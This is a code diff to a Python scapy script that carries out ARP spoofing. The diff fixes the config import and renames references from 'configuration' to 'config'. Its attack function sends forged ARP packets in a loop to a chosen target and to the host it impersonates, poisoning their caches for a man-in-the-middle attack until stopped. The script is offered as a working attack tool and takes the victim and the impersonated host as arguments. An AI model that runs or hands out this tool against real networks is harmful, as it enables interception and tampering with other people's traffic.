@@ -1,10 +1,11 @@
 import msvcrt
 from scapy.all import *
-from . import config
 import threading
+from arp_spoofing import config
 from datetime import datetime
 import os
 import time
+import sys
 
 CONTINUE = True
 
@@ -21,32 +22,32 @@ def wait_for_stop():
 
 
 def attack(host_to_attack, host_to_impersonate):
-    packet_to_target = Ether() / ARP(op=configuration.WHO_HAS_REQUEST, psrc=host_to_impersonate, pdst=host_to_attack)
-    packet_to_router = Ether() / ARP(op=configuration.IS_AT_REQUEST, psrc=host_to_attack, pdst=host_to_impersonate)
+    packet_to_target = Ether() / ARP(op=config.WHO_HAS_REQUEST, psrc=host_to_impersonate, pdst=host_to_attack)
+    packet_to_router = Ether() / ARP(op=config.IS_AT_REQUEST, psrc=host_to_attack, pdst=host_to_impersonate)
     packets_count = 0
-    print(configuration.SHOW_TARGET_MESSAGE % host_to_attack)
-    print(configuration.GUIDELINE_MESSAGE + os.linesep)
+    print(config.SHOW_TARGET_MESSAGE % host_to_attack)
+    print(config.GUIDELINE_MESSAGE + os.linesep)
     wait_for_stop_thread = threading.Thread(target=wait_for_stop)
     wait_for_stop_thread.start()
 
     while CONTINUE:
-        sys.stdout.write(configuration.SHOW_PACKETS_COUNT_MESSAGE % str(packets_count))
+        sys.stdout.write(config.SHOW_PACKETS_COUNT_MESSAGE % str(packets_count))
         sys.stdout.flush()
-        sendp(packet_to_target, verbose=configuration.PACKET_VERBOSE)
-        sendp(packet_to_router, verbose=configuration.PACKET_VERBOSE)
+        sendp(packet_to_target, verbose=config.PACKET_VERBOSE)
+        sendp(packet_to_router, verbose=config.PACKET_VERBOSE)
         packets_count += 2
-        time.sleep(configuration.SLEEP_TIME)
+        time.sleep(config.SLEEP_TIME)
 
 
 def main():
     if len(sys.argv) == 3:
-        print(os.linesep + configuration.OPENING_MESSAGE % get_time_string() + os.linesep)
+        print(os.linesep + config.OPENING_MESSAGE % get_time_string() + os.linesep)
         host_to_attack = sys.argv[1]
         host_to_impersonate = sys.argv[2]
 
         attack(host_to_attack, host_to_impersonate)
     else:
-        print(configuration.INVALID_ARGUMENTS_MESSAGE)
+        print(config.INVALID_ARGUMENTS_MESSAGE)
         sys.exit(1)
 
 
